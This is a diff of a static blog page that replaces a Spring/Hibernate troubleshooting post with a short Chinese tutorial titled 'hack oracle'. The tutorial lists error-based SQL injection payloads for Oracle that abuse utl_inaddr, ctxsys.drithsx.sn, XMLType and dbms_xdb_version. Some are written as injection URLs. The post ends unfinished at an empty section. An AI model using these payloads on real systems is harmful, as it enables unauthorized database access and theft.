@@ -4,26 +4,29 @@
 <head>
   <meta charset="UTF-8">
   
-    <title>org.hibernate.HibernateException: Could not obtain transaction-synchronized Session for current thread | 随风&#39;S Blog</title>
+    <title>hack oracle | 随风&#39;S Blog</title>
     <meta name="viewport" content="width=device-width, initial-scale=1,user-scalable=no">
     
     <meta name="author" content="iswin">
     
 
     
-    <meta name="description" content="今天在做一个小项目时用到了hibernate4和spring mvc 4.x，在做整合时一切都比较顺利，但是在测试hibernate插入数据时抛出了个异常1org.hibernate.HibernateException: Could not obtain transaction-synchronized Session for current thread
-查了相关资料发现是事务配置有问题，我一">
+    <meta name="description" content="本文主要讨论在得到一枚oracle注入点时，如何通过Oracle自带函数或者缺陷获取数据，权限提升以及获得系统权限。
+报错注入的几种方式0x1 utl_inaddr.get_host_name这种方法在Oracle 8g，9g，10g中不需要任何权限，但是在Oracle 11g以及以后的版本中，官方加强了访问控制权限，所以在11g以后要使用此方法进行报错注入，当前数据库用户必须有网络访问权限。
+P">
 <meta property="og:type" content="article">
-<meta property="og:title" content="org.hibernate.HibernateException: Could not obtain transaction-synchronized Session for current thread">
-<meta property="og:url" content="http://www.iswin.org/2015/03/04/org-hibernate-HibernateException-Could-not-obtain-transaction-synchronized-Session-for-current-thread/index.html">
+<meta property="og:title" content="hack oracle">
+<meta property="og:url" content="http://www.iswin.org/2015/06/13/hack-oracle/index.html">
 <meta property="og:site_name" content="随风'S Blog">
-<meta property="og:description" content="今天在做一个小项目时用到了hibernate4和spring mvc 4.x，在做整合时一切都比较顺利，但是在测试hibernate插入数据时抛出了个异常1org.hibernate.HibernateException: Could not obtain transaction-synchronized Session for current thread
-查了相关资料发现是事务配置有问题，我一">
-<meta property="og:updated_time" content="2015-06-08T11:23:21.000Z">
+<meta property="og:description" content="本文主要讨论在得到一枚oracle注入点时，如何通过Oracle自带函数或者缺陷获取数据，权限提升以及获得系统权限。
+报错注入的几种方式0x1 utl_inaddr.get_host_name这种方法在Oracle 8g，9g，10g中不需要任何权限，但是在Oracle 11g以及以后的版本中，官方加强了访问控制权限，所以在11g以后要使用此方法进行报错注入，当前数据库用户必须有网络访问权限。
+P">
+<meta property="og:updated_time" content="2015-06-13T12:37:24.000Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="org.hibernate.HibernateException: Could not obtain transaction-synchronized Session for current thread">
-<meta name="twitter:description" content="今天在做一个小项目时用到了hibernate4和spring mvc 4.x，在做整合时一切都比较顺利，但是在测试hibernate插入数据时抛出了个异常1org.hibernate.HibernateException: Could not obtain transaction-synchronized Session for current thread
-查了相关资料发现是事务配置有问题，我一">
+<meta name="twitter:title" content="hack oracle">
+<meta name="twitter:description" content="本文主要讨论在得到一枚oracle注入点时，如何通过Oracle自带函数或者缺陷获取数据，权限提升以及获得系统权限。
+报错注入的几种方式0x1 utl_inaddr.get_host_name这种方法在Oracle 8g，9g，10g中不需要任何权限，但是在Oracle 11g以及以后的版本中，官方加强了访问控制权限，所以在11g以后要使用此方法进行报错注入，当前数据库用户必须有网络访问权限。
+P">
 
     
     <link rel="alternative" href="/atom.xml" title="随风&#39;S Blog" type="application/atom+xml">
@@ -83,14 +86,14 @@
 		<header class="article-info clearfix">
   <h1 itemprop="name">
     
-      <a href="/2015/03/04/org-hibernate-HibernateException-Could-not-obtain-transaction-synchronized-Session-for-current-thread/" title="org.hibernate.HibernateException: Could not obtain transaction-synchronized Session for current thread" itemprop="url">org.hibernate.HibernateException: Could not obtain transaction-synchronized Session for current thread</a>
+      <a href="/2015/06/13/hack-oracle/" title="hack oracle" itemprop="url">hack oracle</a>
   </h1>
   <p class="article-author">By
        
 		<a href="/about" title="iswin" target="_blank" itemprop="author">iswin</a>
 		
   <p class="article-time">
-    <time datetime="2015-03-04T10:16:09.000Z" itemprop="datePublished"> 发表于 2015-03-04</time>
+    <time datetime="2015-06-13T06:57:34.000Z" itemprop="datePublished"> 发表于 2015-06-13</time>
     
   </p>
 </header>
@@ -99,25 +102,34 @@
 		<div id="toc" class="toc-article">
 			<strong class="toc-title">文章目录</strong>
 		
-			<ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#参考链接"><span class="toc-number">1.</span> <span class="toc-text">参考链接</span></a></li></ol>
+			<ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#报错注入的几种方式"><span class="toc-number">1.</span> <span class="toc-text">报错注入的几种方式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x1_utl_inaddr-get_host_name"><span class="toc-number">2.</span> <span class="toc-text">0x1 utl_inaddr.get_host_name</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x2_ctxsys-drithsx-sn"><span class="toc-number">3.</span> <span class="toc-text">0x2 ctxsys.drithsx.sn</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x3_XMLType"><span class="toc-number">4.</span> <span class="toc-text">0x3 XMLType</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x4_dbms_xdb_version-checkin"><span class="toc-number">5.</span> <span class="toc-text">0x4 dbms_xdb_version.checkin</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x5_dbms_xdb_version-makeversioned"><span class="toc-number">6.</span> <span class="toc-text">0x5 dbms_xdb_version.makeversioned</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x6_dbms_xdb_version-uncheckout"><span class="toc-number">7.</span> <span class="toc-text">0x6 dbms_xdb_version.uncheckout</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x7_dbms_utility-sqlid_to_sqlhash"><span class="toc-number">8.</span> <span class="toc-text">0x7 dbms_utility.sqlid_to_sqlhash</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x8"><span class="toc-number">9.</span> <span class="toc-text">0x8</span></a></li></ol>
 		
 		</div>
 		
-		<p>今天在做一个小项目时用到了hibernate4和spring mvc 4.x，在做整合时一切都比较顺利，但是在测试hibernate插入数据时抛出了个异常<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">org<span class="class">.hibernate</span><span class="class">.HibernateException</span>: Could not obtain transaction-synchronized Session <span class="keyword">for</span> current thread</span><br></pre></td></tr></table></figure></p>
-<p>查了相关资料发现是事务配置有问题，我一般比较习惯用声明式注解，所以就用了来配置了，调试了半天还是一样的错<br>误，实在是找不到错误在哪里，最后我用注解的方式开启了事务管理(@EnableTransactionManagement)，一切正常，看来真是事务的问题，实在是不知道哪里错了，就看了下官方的文档，发现这两种开启事务的方式的作用域范围。</p>
-<p>@EnableTransactionManagement 和 tx:annotation-driven只查找在同一个application context中bean上面查找@Transactional，也就是说在采用注解开启事务管理里和Transactional在同一上下文当中，而在xml配置的时候把加载的顺序搞反了，正常的顺序应该是<context:component-scan ..="">扫包完成bean的注册之后，tx:annotation-driven才会在spring注册的bean里面扫描@Transactional注解，而我恰恰把顺序给弄反了。</context:component-scan></p>
-<p>正确地方式应该像这样：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="title">context:annotation-config</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">context:component-scan</span> <span class="attribute">base-package</span>=<span class="value">""</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">tx:annotation-driven</span> /&gt;</span></span><br></pre></td></tr></table></figure></p>
-<h3 id="参考链接">参考链接</h3><p>  [1] : <a href="http://forum.spring.io/forum/spring-projects/web/80895-why-tx-annotation-driven-doesn-t-work-in-my-service-configuration-file" target="_blank" rel="external">http://forum.spring.io/forum/spring-projects/web/80895-why-tx-annotation-driven-doesn-t-work-in-my-service-configuration-file</a></p>
-  
+		<p>本文主要讨论在得到一枚oracle注入点时，如何通过Oracle自带函数或者缺陷获取数据，权限提升以及获得系统权限。</p>
+<h3 id="报错注入的几种方式">报错注入的几种方式</h3><h3 id="0x1_utl_inaddr-get_host_name">0x1 utl_inaddr.get_host_name</h3><p>这种方法在<em>Oracle 8g，9g，10g</em>中不需要任何权限，但是在<em>Oracle 11g</em>以及以后的版本中，官方加强了访问控制权限，所以在11g以后要使用此方法进行报错注入，当前数据库用户必须有网络访问权限。</p>
+<pre><code>POC:<span class="comment"><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.iswin.org/oracle.jsp?name=' and 	1=utl_inaddr.get_host_name((<span class="operator"><span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> dual))<span class="comment">--</span></span></span><br></pre></td></tr></table></figure></span>
+</code></pre><h3 id="0x2_ctxsys-drithsx-sn">0x2 ctxsys.drithsx.sn</h3><pre><code>POC<span class="comment"><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.iswin.org/oracle.jsp?name=' and 1=ctxsys.drithsx.sn(1,	(<span class="operator"><span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> dual))<span class="comment">--</span></span></span><br></pre></td></tr></table></figure></span>
+</code></pre><h3 id="0x3_XMLType">0x3 XMLType</h3><p>在使用这个XMLType进行报错时，很多人不知道为什么要用chr(60)，通过ascii查询可以看到，60:&lt;,58:’:’,62:’&gt;’,查了下相关的api，发现xmltype在进行解析的时候必须以&lt;开头&gt;结尾，这里:冒号在这是必不可少的，至于为什么是冒号这个我也没查到，另外需要注意的是如果返回的数据种有空格的话，它会自动截断，导致数据不完整，有replace函数替换成其他非空字符就可以。<br>    POC<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator"><span class="keyword">select</span> <span class="keyword">upper</span>(XMLType(chr(<span class="number">60</span>)||chr(<span class="number">58</span>)||(<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> dual)||chr(<span class="number">62</span>))) <span class="keyword">from</span> dual</span></span><br></pre></td></tr></table></figure></p>
+<h3 id="0x4_dbms_xdb_version-checkin">0x4 dbms_xdb_version.checkin</h3><pre><code><span class="comment"><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator"><span class="keyword">select</span> dbms_xdb_version.checkin((<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> dual)) <span class="keyword">from</span> dual</span></span><br></pre></td></tr></table></figure></span>
+</code></pre><h3 id="0x5_dbms_xdb_version-makeversioned">0x5 dbms_xdb_version.makeversioned</h3><pre><code><span class="comment"><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator"><span class="keyword">select</span> dbms_xdb_version.makeversioned((<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> dual)) <span class="keyword">from</span> dual</span></span><br></pre></td></tr></table></figure></span>
+</code></pre><h3 id="0x6_dbms_xdb_version-uncheckout">0x6 dbms_xdb_version.uncheckout</h3><pre><code><span class="comment"><figure class="highlight sql"><figcaption><span>select dbms_xdb_version.uncheckout((select user from dual)) from dual</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">	</span><br></pre></td></tr></table></figure></span>
+</code></pre><h3 id="0x7_dbms_utility-sqlid_to_sqlhash">0x7 dbms_utility.sqlid_to_sqlhash</h3><pre><code><span class="comment"><figure class="highlight sql"><figcaption><span>SELECT dbms_utility.sqlid_to_sqlhash((select user from dual)) from dual</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">	</span><br></pre></td></tr></table></figure></span>
+</code></pre><h3 id="0x8">0x8</h3>  
 	</div>
 		<footer class="article-footer clearfix">
 <div class="article-catetags">
 
 <div class="article-categories">
   <span></span>
-  <a class="article-category-link" href="/categories/Spring/">Spring</a>
+  <a class="article-category-link" href="/categories/ORACLE/">ORACLE</a>
 </div>
 
+
+  <div class="article-tags">
+  
+  <span></span> <a href="/tags/JAVA/">JAVA</a><a href="/tags/ORACLE/">ORACLE</a>
+  </div>
 
 </div>
 
@@ -125,7 +137,7 @@
 
 	<div class="article-share" id="share">
 	
-	  <div data-url="http://www.iswin.org/2015/03/04/org-hibernate-HibernateException-Could-not-obtain-transaction-synchronized-Session-for-current-thread/" data-title="org.hibernate.HibernateException: Could not obtain transaction-synchronized Session for current thread | 随风&#39;S Blog" data-tsina="null" class="share clearfix">
+	  <div data-url="http://www.iswin.org/2015/06/13/hack-oracle/" data-title="hack oracle | 随风&#39;S Blog" data-tsina="null" class="share clearfix">
 	  </div>
 	
 	</div>
@@ -138,19 +150,11 @@
 	
 <nav class="article-nav clearfix">
  
- <div class="prev" >
- <a href="/2015/03/04/Elasticsearch-Groovy-remote-code-execution/" title="Elasticsearch Groovy 远程代码执行漏洞">
-  <strong>上一篇：</strong><br/>
-  <span>
-  Elasticsearch Groovy 远程代码执行漏洞</span>
-</a>
-</div>
-
 
 <div class="next">
-<a href="/2015/01/15/JAVA-simulation-microblogging-login-and-microblogging/"  title="JAVA模拟微博登录以及发微博">
+<a href="/2015/03/04/Elasticsearch-Groovy-remote-code-execution/"  title="Elasticsearch Groovy 远程代码执行漏洞">
  <strong>下一篇：</strong><br/> 
- <span>JAVA模拟微博登录以及发微博
+ <span>Elasticsearch Groovy 远程代码执行漏洞
 </span>
 </a>
 </div>
@@ -159,7 +163,7 @@
 
 	
 <section id="comments" class="comment">
-	<div class="ds-thread" data-thread-key="2015/03/04/org-hibernate-HibernateException-Could-not-obtain-transaction-synchronized-Session-for-current-thread/" data-title="org.hibernate.HibernateException: Could not obtain transaction-synchronized Session for current thread" data-url="http://www.iswin.org/2015/03/04/org-hibernate-HibernateException-Could-not-obtain-transaction-synchronized-Session-for-current-thread/"></div>
+	<div class="ds-thread" data-thread-key="2015/06/13/hack-oracle/" data-title="hack oracle" data-url="http://www.iswin.org/2015/06/13/hack-oracle/"></div>
 </section>
 
 
@@ -169,7 +173,7 @@
   <div id="toc" class="toc-aside">
   <strong class="toc-title">文章目录</strong>
  
- <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#参考链接"><span class="toc-number">1.</span> <span class="toc-text">参考链接</span></a></li></ol>
+ <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#报错注入的几种方式"><span class="toc-number">1.</span> <span class="toc-text">报错注入的几种方式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x1_utl_inaddr-get_host_name"><span class="toc-number">2.</span> <span class="toc-text">0x1 utl_inaddr.get_host_name</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x2_ctxsys-drithsx-sn"><span class="toc-number">3.</span> <span class="toc-text">0x2 ctxsys.drithsx.sn</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x3_XMLType"><span class="toc-number">4.</span> <span class="toc-text">0x3 XMLType</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x4_dbms_xdb_version-checkin"><span class="toc-number">5.</span> <span class="toc-text">0x4 dbms_xdb_version.checkin</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x5_dbms_xdb_version-makeversioned"><span class="toc-number">6.</span> <span class="toc-text">0x5 dbms_xdb_version.makeversioned</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x6_dbms_xdb_version-uncheckout"><span class="toc-number">7.</span> <span class="toc-text">0x6 dbms_xdb_version.uncheckout</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x7_dbms_utility-sqlid_to_sqlhash"><span class="toc-number">8.</span> <span class="toc-text">0x7 dbms_utility.sqlid_to_sqlhash</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x8"><span class="toc-number">9.</span> <span class="toc-text">0x8</span></a></li></ol>
  
   </div>
 
